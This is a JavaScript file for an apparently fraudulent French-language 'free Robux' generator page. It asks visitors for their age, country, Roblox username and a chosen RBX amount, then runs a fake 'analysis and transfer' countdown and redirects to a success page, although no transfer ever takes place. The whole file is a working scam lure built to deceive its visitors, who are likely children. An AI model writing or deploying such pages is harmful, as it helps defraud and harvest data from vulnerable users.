
document.addEventListener("DOMContentLoaded", () => {
  const app = document.getElementById("app");
  let currentStep = 0;

  const steps = [
    `
      <div class="step active" id="step-1">
        <h2>Salut !</h2>
        <p>Merci de nous indiquer votre âge et votre pays actuel :</p>
        <input type="number" placeholder="Âge" id="age"/>
        <select id="country">
          <option value="France">France</option>
          <option value="Belgique">Belgique</option>
          <option value="Suisse">Suisse</option>
          <option value="Maroc">Maroc</option>
        </select>
        <button onclick="nextStep()">Suivant</button>
      </div>
    `,
    `
      <div class="step" id="step-2">
        <h2>Super !</h2>
        <p>Pour transférer tes RBX, il nous faut :</p>
        <input type="text" placeholder="Ton pseudo Roblox" id="username"/>
        <select id="amount">
          <option value="10000">10K</option>
          <option value="50000">50K</option>
          <option value="100000">100K</option>
        </select>
        <button onclick="nextStep()">Suivant</button>
      </div>
    `,
    `
      <div class="step" id="step-3">
        <h2>Analyse et transfert...</h2>
        <p id="countdown">5</p>
      </div>
    `
  ];

  app.innerHTML = steps.join("");

  window.nextStep = () => {
    const allSteps = document.querySelectorAll(".step");
    if (currentStep < allSteps.length - 1) {
      allSteps[currentStep].classList.remove("active");
      currentStep++;
      allSteps[currentStep].classList.add("active");

      if (currentStep === 2) {
        startCountdown();
      }
    }
  };

  function startCountdown() {
    let time = 5;
    const countdown = document.getElementById("countdown");
    const interval = setInterval(() => {
      time--;
      countdown.textContent = time;
      if (time === 0) {
        clearInterval(interval);
        const username = document.getElementById("username").value;
        const amount = document.getElementById("amount").value;
        window.location.href = `success.html?username=${encodeURIComponent(username)}&amount=${encodeURIComponent(amount)}`;
      }
    }, 1000);
  }
});
